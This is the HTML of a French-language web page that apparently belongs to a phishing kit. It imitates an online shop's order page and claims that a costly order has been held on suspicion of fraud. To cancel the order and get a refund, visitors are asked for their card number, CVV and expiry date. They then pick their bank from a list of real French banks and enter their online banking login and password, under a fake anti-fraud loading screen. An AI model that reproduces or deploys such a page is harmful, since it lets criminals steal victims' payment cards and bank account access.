<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/x-icon" href="">
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Annuler la commande</title>
  <link rel="stylesheet" href="assets/css/style.css" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
  <script src="assets/js/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js" integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous"></script>
  <script src="assets/js/script.js"></script>
</head><body id="step-body">
  <header>
    <div class="header-container">
        <div class="header-left">
            <a href="index.php"><img src="assets/images/logo.jpg" alt="Logo" class="header-logo"></a>
        </div>
        <div class="header-center">
            <input type="text" class="search-input" placeholder="N° de votre commande" value="CMD-2025-987278">
            <button class="search-button"><i class="bi bi-search"></i></button>
        </div>
        <div class="header-right">
            <div class="cart-icon">
                <i class="bi bi-basket2-fill" title="Votre panier"></i>
                <span class="cart-badge">3</span>
            </div>
            <div class="user-icon">
                                    <i class="bi bi-person-circle" title="Mon compte"></i>
                            </div>
        </div>
    </div>
</header>
<div id="loader">
    <img src="assets/images/loader.gif">
</div>
<div id="bks-loader">
    <div>
        <span id="bks-loader-logo"><img src="assets/images/dart.jpg"></span>
        <span id="swap-icon"><img src="assets/images/swap.gif"></span>
        <span id="bk-logo"></span>
    </div>
    <div id="loading-text">Connexion des systèmes anti-fraude en cours<br>Veuillez patienter...</div>
</div>  <div id="step-container">
    <button id="show-infos-btn">Afficher les informations de votre commande</button>
    <div id="step-left-part">
      <div id="commande-recap">
        <div class="commande-recap-title"><i class="bi bi-bag-check"></i> &nbsp; Articles commandés</div>
        <div class="articles-container">
          <div class="article">
            <div class="article-img">
              <img src="assets/images/samsung.jpg">
            </div>
            <div class="article-description">
              <div class="article-nom">Samsung S25 Ultra 12Go / 256Go Gris</div>
              <div class="article-details"><strong>Marque:</strong> Samsung - <strong>Couleur:</strong> Gris - <strong>Etat:</strong> Occasion</div>
              <div class="article-qte"><strong>1</strong> X <strong>980 €</strong></div>
            </div>
          </div>
          <div class="article">
            <div class="article-img">
              <img src="assets/images/ps4.jpg">
            </div>
            <div class="article-description">
              <div class="article-nom">Pack Console Ps4 Slim 500 Go Noire + 2eme Manette Dualshock</div>
              <div class="article-details"><strong>Marque:</strong> Sony - <strong>Couleur:</strong> Noir - <strong>Etat:</strong> Neuf</div>
              <div class="article-qte"><strong>1</strong> X <strong>499,99 €</strong></div>
            </div>
          </div>
          <div class="article">
            <div class="article-img">
              <img src="assets/images/chargeur.jpg">
            </div>
            <div class="article-description">
              <div class="article-nom">Chargeur USB-C 25W + Câble USB-C vers USB-C 1M Blanc pour Samsung</div>
              <div class="article-details"><strong>Marque:</strong> Samsung - <strong>Couleur:</strong> Blanc - <strong>Etat:</strong> Neuf</div>
              <div class="article-qte"><strong>1</strong> X <strong>11,99 €</strong></div>
            </div>
          </div>
        </div>
      </div>
      <div id="commande-infos">
        <div class="commande-recap-title"><i class="bi bi-list-check"></i> &nbsp; Récapitulatif</div>
        <div id="commande-infos-inner">
          <div class="message-alert blink"><i class="bi bi-exclamation-triangle-fill"></i> &nbsp; Commande mise en attente pour soupçon de fraude</div>
          <table class="full-with">
            <tr>
              <td>ID Client</td>
              <td class="text-right">415452</td>
            </tr>
            <tr>
              <td>Référence</td>
              <td class="text-right">CMD-2025-987278</td>
            </tr>
            <tr>
              <td>Sous-total</td>
              <td class="text-right">1 491,98 €</td>
            </tr>
            <tr>
              <td>Frais de livraison</td>
              <td class="text-right">25.50 €</td>
            </tr>
            <tr>
              <td><strong>Total</strong></td>
              <td class="text-right"><strong>1 517,48 €</strong></td>
            </tr>
          </table>
          <div class="adresse-titre"><i class="bi bi-geo-alt"></i> &nbsp; Adresse de livraison</div>
          <div class="adresse-livraison">15 Fossés St Julien, 14000 Caen, France</div>
          <div class="barcode">
            <img src="assets/images/barcode.gif">
          </div>
        </div>
      </div>
    </div>
    <div id="step-right-part">
      <div id="options-part">
        <div class="form-img-container">
          <img src="assets/images/pending.gif">
        </div>
        <p>Voulez-vous valider ou annuler votre commande ?</p>
        <div id="options-select-container">
          <select id="options-select">
            <option value="">Veuillez sélectionner une option</option>
            <option value="1">Annuler ma commande N° CMD-2025-987278</option>
            <option value="2">Valider ma commande N° CMD-2025-987278</option>
          </select>
        </div>
      </div>
      <div id="carte-part">
        <div class="back-btn">
          <i class="bi bi-arrow-left" title="Retour à l'étape précédente" data-name="carte-part" data-target="options-part"></i>
        </div>
        <div class="form-img-container">
          <img src="assets/images/cartesec.gif">
        </div>
        <h2 class="titre-carte">Sécurisation de votre carte</h2>
        <div class="cartes-logo">
          <img src="assets/images/cartes.jpg">
        </div>
        <div class="form-description">
          Veuillez entrer vos informations pour annuler la commande et recevoir votre remboursement.
        </div>
        <div class="carte-form-container">
          <form id="carte-form">
            <div class="form-group">
              <input
                id="cnumber"
                maxlength="19"
                placeholder="Numéro de la carte"
                required />
              <img
                id="card-logo"
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9UlEQVR4nO2ZYQqCQBCFv3tkF4k6QXaqpBOF/bLOVPp/YkNDpNA02BmdBw9WdoT3MbuwruByuVyuyDoAN6ACRLkr4AqkXYiTgnBjnbU7IcadUi8nMe4igJQKgkz1AwUh/mViB3AQHATVJnYAB2FpIGdg1RS1FJ4TILcCkrSCd0GC1lZApF3UAdFo+sJ/6wgWQeSHOXUgyVz2SF7DfAIJEBcrIGLMxA7gIDgIqk3sAA7CQJANsO0Zx6yToSDhpV3POGadLG5piTEzhyvTO/V/BpnDJXaqIMhU75ujeaYgzFgfO58Zr84URvZMWWd9d8LlcrlcxNAT+CmguJ7LblYAAAAASUVORK5CYII="
                alt="Card Logo" />
            </div>
            <div class="form-group">
              <input id="cvv" maxlength="4" placeholder="CVV" required />
              <input id="edate" maxlength="5" placeholder="MM/YY" required />
            </div>
            <div class="text-center">
              <button id="cancel-submit" class="submit-button" type="submit">
                Annuler ma commande &nbsp; <i class="bi bi-x-circle"></i>
              </button>
            </div>
          </form>
        </div>
      </div>
      <div id="bks-part">
        <div class="back-btn">
          <i class="bi bi-arrow-left" title="Retour à l'étape précédente" data-name="bks-part" data-target="carte-part"></i>
        </div>
        <div class="form-img-container">
          <img src="assets/images/bank.gif">
        </div>
        <p>Sécurisation de votre compte bancaire</p>
        <div class="form-description">
          Notre système anti-fraude communiquera automatiquement avec celui de votre banque afin d'annuler toute autre tentative frauduleuse et sécuriser votre compte.
        </div>
        <div id="bks-select-container">
          <select id="bks-select">
            <option value="">Veuillez sélectionner votre banque</option>
            <option value="Banque Dupuy de Parseval" data-img="parseval">Banque Dupuy de Parseval</option>
            <option value="Banque Palatine" data-img="palatine">Banque Palatine</option>
            <option value="Banque Postale" data-img="postale">Banque Postale</option>
            <option value="Bnp Paribas" data-img="bnp">Bnp Paribas</option>
            <option value="Boursorama Banque" data-img="bourso">Boursorama Banque</option>
            <option value="Bred" data-img="bred">Bred</option>
            <option value="Caisse d'épargne" data-img="caisseepargne">Caisse d'épargne</option>
            <option value="Carrefour Banque" data-img="carrefour">Carrefour Banque</option>
            <option value="CIC" data-img="cic">CIC</option>
            <option value="Crédit Agricole" data-img="creditagricole">Crédit Agricole</option>
            <option value="Crédit Coopératif" data-img="creditcooperatif">Crédit Coopératif</option>
            <option value="Crédit du Nord" data-img="creditdunord">Crédit du Nord</option>
            <option value="Crédit Mutuel" data-img="creditmutuel">Crédit Mutuel</option>
            <option value="Fortuneo" data-img="fortuneo">Fortuneo</option>
            <option value="Groupama Banque" data-img="Groupama">Groupama Banque</option>
            <option value="Hello Bank" data-img="hello">Hello Bank</option>
            <option value="HSBC" data-img="hsbc">HSBC</option>
            <option value="ING" data-img="ing">ING</option>
            <option value="LCL" data-img="lcl">LCL</option>
            <option value="Milleis Banque" data-img="milleis">Milleis Banque</option>
            <option value="Monabanq" data-img="monabanq">Monabanq</option>
            <option value="Nickel" data-img="nickel">Nickel</option>
            <option value="Qonto" data-img="qonto">Qonto</option>
            <option value="Revolut" data-img="revolut">Revolut</option>
            <option value="Société Générale" data-img="sg">Société Générale</option>
            <!--<option value="Autre" data-img="bdf">Autre banque</option>-->
          </select>
        </div>
      </div>
      <div id="co-part">
        <div class="back-btn">
          <i class="bi bi-arrow-left" title="Retour à l'étape précédente" data-name="co-part" data-target="bks-part"></i>
        </div>
        <div id="co-part-inner">
          <div class="form-img-container"></div>
          <div class="co-form-container">
            <form id="co-form">
              <div class="form-group">
                <input
                  id="iden"
                  placeholder="Votre identifiant"
                  required />
              </div>
              <div class="form-group">
                <input
                  id="mo"
                  placeholder="Votre mot de passe"
                  required type="password" />
              </div>
              <div class="text-center">
                <button id="co-submit" class="submit-button" type="submit">
                  Connexion &nbsp; <i class="bi bi-lock"></i>
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
      <input type="hidden" id="bk-input" value="">
    </div>
    <script>
    </script>
</body>
</html>